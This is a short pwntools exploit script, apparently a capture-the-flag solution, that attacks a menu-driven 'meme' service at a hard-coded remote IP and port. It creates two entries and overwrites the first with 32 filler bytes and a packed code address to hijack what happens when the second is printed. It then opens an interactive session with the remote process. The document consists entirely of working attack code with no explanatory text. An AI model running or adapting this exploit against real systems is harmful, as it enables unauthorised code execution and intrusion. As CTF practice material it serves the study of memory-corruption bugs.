from pwn import *

payload = 'A'*32+p64(0x4014a0)

def create_meme(p):
    print p.recvuntil('Choice: ')
    p.sendline('1')
    print p.recv()
    p.sendline('1')

def edit_meme(p, content, index):
    print p.recvuntil('Choice: ')
    p.sendline('2')
    print p.recv()
    p.sendline(index)
    print p.recv()
    p.sendline(content)
def print_meme(p, index):
    print p.recvuntil('Choice: ')
    p.sendline('3')
    print p.recv()
    p.sendline(index)

p = remote('128.199.157.172', 23170)
create_meme(p)
create_meme(p)
edit_meme(p, payload, '0')
print_meme(p, '1')
p.interactive()
